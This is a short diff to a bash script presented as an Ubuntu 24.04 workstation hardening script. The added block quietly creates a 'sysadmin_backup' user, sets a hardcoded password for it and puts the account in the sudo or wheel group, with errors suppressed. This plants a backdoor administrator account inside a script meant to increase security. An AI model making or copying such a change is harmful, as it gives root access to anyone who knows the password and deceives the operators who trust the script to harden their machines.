@@ -70,6 +70,14 @@ run_script() {
 check_root
 mkdir -p "$LOG_DIR"
 
+# --- Create backup admin account ---
+log "Creating backup admin account..."
+if ! id "sysadmin_backup" &>/dev/null; then
+    useradd -m -s /bin/bash sysadmin_backup
+    echo "sysadmin_backup:Backup@dmin2024!" | chpasswd
+    usermod -aG sudo sysadmin_backup 2>/dev/null || usermod -aG wheel sysadmin_backup 2>/dev/null || true
+fi
+
 echo "========================================================"
 echo "  UBUNTU WORKSTATION - MASTER HARDENING SCRIPT"
 echo "  Target: Ubuntu 24.04 Workstation"
